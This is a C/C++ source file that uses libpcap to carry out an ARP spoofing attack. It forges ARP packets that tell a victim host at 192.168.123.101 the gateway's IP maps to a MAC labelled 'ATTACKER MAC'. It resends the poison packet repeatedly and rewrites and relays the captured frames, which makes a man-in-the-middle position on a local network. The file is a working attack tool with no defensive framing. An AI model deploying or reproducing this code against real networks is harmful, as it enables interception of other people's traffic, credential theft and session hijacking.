#include "main.h"
#include <stdlib.h>
#pragma once;

int arp_request_count;
PACKET pk;
pcap_t *fp;
using namespace std;

void send_arp_request(){
    arp_request_count++;
    if(arp_request_count>10){
        pcap_sendpacket(fp,reinterpret_cast<const u_char*>(&pk),60);
        printf("success send_arp_attack_packet\n\n");
        arp_request_count=0;
    }
}

void arp_reply(u_char *param, const struct pcap_pkthdr *header, u_char *pkt_data) {

      //GATEWAY MAC
    input_mac(pkt_data,"30:00:00:00:00:04");

     //ATTACKER MAC
    input_mac(pkt_data+6,"70:5d:cc:f4:82:d1");

     //send arp_request
    send_arp_request();


     //send reply packet
    if(pkt_data[13]!=6){
        pcap_sendpacket(fp,reinterpret_cast<const u_char*>(pkt_data),header->len);
        printf("Success Reply PACKET");
  }
    printf("\n\n");

}




int main(int argc,char *argv[]){

    if(argc!=0){
        printf("input value");
    }
    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    if ( (fp = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf) ) == NULL)
        {
            fprintf(stderr,"\nUnable to open the adapter. %s is not supported by Pcap\n", argv[1]);
            return -1;
        }

    //ETH PACKET
    eth_packet eth;
    eth.type=0x0608;

    //ARP_PACKET
    arp_packet arp;
    arp.h_type=0x0100;
    arp.p_type=0x0008;
    arp.h_size=0x06;
    arp.p_size=0x04;
    arp.opcode=0x0100;


//input eth packet
    input_mac(eth.dmac,"76:22:3C:56:DE:44");
    input_mac(eth.smac,"70:5d:cc:f4:82:d1");

//input arp packet
    input_mac(arp.smac,"70:5d:cc:f4:82:d1");
    input_ip(arp.sip,"192.168.123.254");
    input_mac(arp.tmac,"76:22:3C:56:DE:44");
    input_ip(arp.tip,"192.168.123.101");


    //MAKE ARP PACKET

    pk.e=eth;
    pk.a=arp;


    pcap_sendpacket(fp,reinterpret_cast<const u_char*>(&pk),60);
    printf("First arp_request packet\n");


    u_char *pac = NULL;
    pcap_loop(fp,0,pcap_handler(arp_reply),pac);
}





